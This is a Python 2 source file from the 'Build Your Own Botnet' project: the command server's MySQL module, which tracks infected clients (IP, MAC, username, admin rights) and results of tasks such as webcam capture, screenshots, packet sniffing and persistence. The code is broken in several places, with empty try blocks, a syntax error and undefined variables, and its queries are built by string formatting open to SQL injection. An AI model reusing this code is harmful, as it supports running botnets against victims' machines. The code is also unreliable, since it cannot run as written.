#!/usr/bin/python
"""
Build Your Own Botnet
github.com/colental/byob
Copyright (c) 2018 Daniel Vega-Myhre
"""
from __future__ import print_function
import os
import json
import time
import Queue
import colorama
import datetime
import threading
import mysql.connector


class DatabaseError(mysql.connector.ProgrammingError):
    pass


class Database(mysql.connector.MySQLConnection):
    """
    Database (Build Your Own Botnet)
    """
    def __init__(self, setup='setup.sql', tasks=('persistence','screenshot','webcam','email','scan','packetsniffer'), **kwargs):
        """
        create a new Database handler instance
             setup      path to setup.sql batch file to create the database
             tasks      types of task results for the database to store during the session
             kwargs     MysQL database credentials: host, user, password [,database]
        """
        super(Database, self).__init__(**kwargs)
        self.config(**kwargs)
        self.tasks = tasks
        self.queue = Queue.Queue()
        self.setup = self._setup(setup)
        self.query = self.cursor(named_tuple=True)

    def _debug(self, output):
        if self._debug:
            print(str(output))

    def _setup(self, setup):
        if isinstance(setup, str):
            if os.path.isfile(setup):
                try:
                    self.execute_file(setup)
                    return True
                except Exception as e:
                    self._debug("{} error: {}".format(self._setup.func_name, str(e)))
        raise DatabaseError("{} error: database setup file is broken")
            
    def _print(self, info):
        if isinstance(info, dict):
            max_key = int(max(map(len, [str(i1) for i1 in info.keys() if i1 if i1 != 'None'])) + 2) if int(max(map(len, [str(i1) for i1 in info.keys() if i1 if i1 != 'None'])) + 2) < 80 else 80
            max_val = int(max(map(len, [str(i2) for i2 in info.values() if i2 if i2 != 'None'])) + 2) if int(max(map(len, [str(i2) for i2 in info.values() if i2 if i2 != 'None'])) + 2) < 80 else 80
            key_len = {len(str(i2)): str(i2) for i2 in info.keys() if i2 if i2 != 'None'}
            keys    = {k: key_len[k] for k in sorted(key_len.keys())}
            for key in keys.values():
                if info.get(key) and info.get(key) != 'None':
                    if len(str(info.get(key))) > 80:
                        info[key] = str(info.get(key))[:77] + '...'
                    info[key] = str(info.get(key)).replace('\n',' ') if not isinstance(info.get(key), datetime.datetime) else str(info.get(key)).encode().replace("'", '"').replace('True','true').replace('False','false') if not isinstance(info.get(key), datetime.datetime) else str(int(time.mktime(info.get(key).timetuple())))
                    print('\x20' * 4 + key.ljust(max_key).center(max_key + 2) + info[key].ljust(max_val).center(max_val + 2))
        elif isinstance(info, str):
            try:
                info = json.loads(info)
                self._print(info)
            except:
                print(info)
        else:
            print("Server method {} received invalid input ({}): '{}'".format(self._print.func_name, type(info), repr(info)))


    def _reconnect(self):
        try:
            self.reconnect()
            self.query = self.cursor(named_tuple=True)
            return "{}@{} reconnected".format(self.database.user, self.database.server_host)
        except Exception as e:
            self._debug("{} error: {}".format(self._reconnect.func_name, str(e)))

    def _display(self, info):
        print('\n')
        if isinstance(info, dict):
            if len(info):
                self._print(json.dumps(info))
        elif isinstance(info, list):
            if len(info):
                for data in info:
                    print('  %d\n' % int(info.index(data) + 1), end="")
                    self._print(data)
        elif isinstance(info, str):
            try:
                self._print(json.loads(info))
            except:
                self._print(str(info))
        else:
            self._debug("{} error: invalid data type '{}'".format(self._display.func_name, type(info)))


    def get_client(self, client_id=None):
        """
        Get client from database
        """
        try:

        except Exception as e:
            
        


    def handle_client(self, **kwargs):
        """
        Handle a new/current client by adding/updating database
        """
        try:
            if kwargs.get('id') and isinstance(kwargs['id'], str) and len(kwargs['id']) == 32:
                client_id = kwargs.get('id')
                if self.execute_query("SELECT * FROM tbl_clients WHERE id='{}'".format(client_id)):
                    self.execute_query("UPDATE tbl_clients SET last_online='{}' WHERE id='{}'".format(datetime.datetime.now(), client_id))
                    print("\n\n" + colorama.Fore.GREEN  + colorama.Style.DIM + " [+] " + colorama.Fore.RESET + "Client {} has reconnected\n".format(self._name))
                else:
                    print("\n\n" + colorama.Fore.GREEN  + colorama.Style.BRIGHT + " [+] " + colorama.Fore.RESET + "New connection - Client {}: \n".format(self._name))
                    self._display(data)
                    values = map(data.get, ['id', 'public_ip', 'local_ip', 'mac_address', 'username', 'administrator', 'device', 'platform', 'architecture'])
                    try:
                        self.execute_procedure('sp_addClient', values)
                    except mysql.connector.InterfaceError:
                        pass


    def offline_client(self, client_id=None):
        """
        Update client status to offline
        """
        try:
            if isinstance(client_id, str):
                self.execute_query("UPDATE tbl_clients SET online=0, last_online=NOW() WHERE uid='%s'" % client_id)
            elif isinstance(client_id, int):
                self.execute_query("UPDATE tbl_clients SET online=0, last_online=NOW() WHERE id='%d'" % client_id)
            else:
                raise DatabaseError("{} error: invalid input type (expected {}, received {})".format(self.offline_client.func_name, list, type(client_id)))
        except Exception as e:
            self._debug("{} error: {}".format(self.offline_client.func_name, str(e)))
         
                    

    def remove_client(self, client_id=None):
        """
        Remove client from database
        """
        try:
            if isinstance(client_id, str):
                self.execute_query("DELETE FROM tbl_clients WHERE uid='{}'".format(task_id))
            elif isinstance(client_id, int):
                self.execute_query("DELETE FROM tbl_clients WHERE id=%d" % client_id)
            else:
                raise DatabaseError("{} error: invalid input type (expected {}, received {})".format(self.remove_client.func_name, list, type(client_id)))
        except Exception as e:
            self._debug("{} error: {}".format(self.remove_client.func_name, str(e)))


    def set_tasks(self, tasks):
        """
        Configure types of task results for database to automatically store
        """
        if isinstance(tasks, list) or isinstance(tasks, set):
            self._store_tasks = tasks
        elif isinstance(tasks, dict):
            self._store_tasks = [task for task,value in tasks.items() if value]
        else:
            raise DatabaseError("{} error: argument 'tasks' must be type {}".format(self.set_tasks.func_name, list))


    def get_tasks(self, session_id=None):
        """
        Get session task results
        """
        try:
            if session_id and isinstance(session_id, str) and len(session_id) == 32:
                try:
                    return self.execute_query("SELECT * FROM tbl_tasks WHERE session='{}'".format(session_id), display=True)
                except Exception as e:
                    self._debug("{} error: {}".format(self.show_results.func_name, str(e)))
            else:
                return "Error: invalid session id - '%s'" % str(session_id)
        except Exception as e:
            self._debug("{} error: {}".format(self.get_tasks.func_name, str(e)))


    def handle_task(self, task):
        """
        Handle an issued/received task by adding/updating database 
        """
        try:
            if isinstance(task, dict):
                if task.get('client') and task.get('session') and task.get('task']):
                    cmd, _, __  = task['task'].partition(' ')
                    if cmd in self._store_tasks:
                        if task.get('result') and task.get('id'):
                            self.execute_query("UPDATE tbl_tasks SET result='{}' WHERE id='{}'".format(task['result'], task['id']), display=False)
                        else:
                            values = [task['client'], task['session'], task['task'], '@task']
                            self.execute_stored_procedure('sp_addTask', args=values, display=False)
                            task = self.execute_query('SELECT @task', display=False)
                            return task
                else:
                    self._debug("{} error: missing one or more arguments ('client','session','task')".format(self.handle_task.func_name))
            else:
                self._debug("{} error: invalid input type (expected {}, received {})".format(self.handle_task.func_name, dict, type(task)))
        except Exception as e:
            self._debug("{} error: {}".format(self.handle_task.func_name, str(e)))


    def remove_task(self, task_id):
        """
        Remove a task from the database
        """
        try:
            if isinstance(task_id, str):
                self.execute_query("DELETE FROM tbl_tasks WHERE id='{}'".format(task_id))
            else:
                raise DatabaseError("{} error: invalid input type (expected {}, received {})".format(self.remove_task.func_name, str, type(task_id)))
            

    def execute_query(self, query, display=False):
        """
        Execute a query and return result, optionally printing output to stdout
        """
        result = []
        try:
            if not self.is_connected():
                self._reconnect()
            result = []
            self.query.execute(query)
            output = self.query.fetchall()
            if output and isinstance(output, list):
                for row in output:
                    row = row._asdict()
                    for key,value in [(key,value) for key,value in row.items() if key in ('last_update','issued','completed','timestamp')]:
                        if isinstance(value, datetime.datetime):
                            row[key] = value.ctime()
                    result.append(row)
            if display:
                for row in result:
                    self._display(json.dumps(row))
        except (mysql.connector.ProgrammingError, mysql.connector.InterfaceError):
            pass
        except Exception as e:
            self._debug("{} error: {}".format(self.execute_query.func_name, str(e)))
        finally:
            return result


    def execute_stored_procedure(self, procedure, args=[], display=False):
        """
        Execute a stored procedure and return result, optionally printing output to stdout
        """
        result = []
        try:
            if not self.is_connected():
                self._reconnect()
            cursor = self.cursor(dictionary=True)
            cursor.callproc(procedure, args)
            result = [row for result in cursor.stored_results() for row in result.fetchall()]
            return result
        except (mysql.connector.InterfaceError, mysql.connector.ProgrammingError):
            pass
        finally:
            return result


    def execute_file(self, sql, display=False):
        """
        Execute SQL commands sequentially from a file
        """
        try:
            result = []
            if isinstance(sql, str):
                if os.path.isfile(sql):
                    with open(sql) as stmts:
                        for line in self.query.execute(stmts.read(), multi=True):
                            result.append(line)
                            if display:
                                print(line)
                else:
                    self.query.execute(sql, multi=True)
            elif isinstance(sql, file):
                with sql as stmts:
                    for line in self.query.execute(stmts.read(), multi=True):
                        result.append(line)
                        if display:
                            print(line)
            else:
                return False
            return result
        except Exception as e:
            raise DatabaseError("{} error: {}".format(self.execute_file.func_name, str(e)))

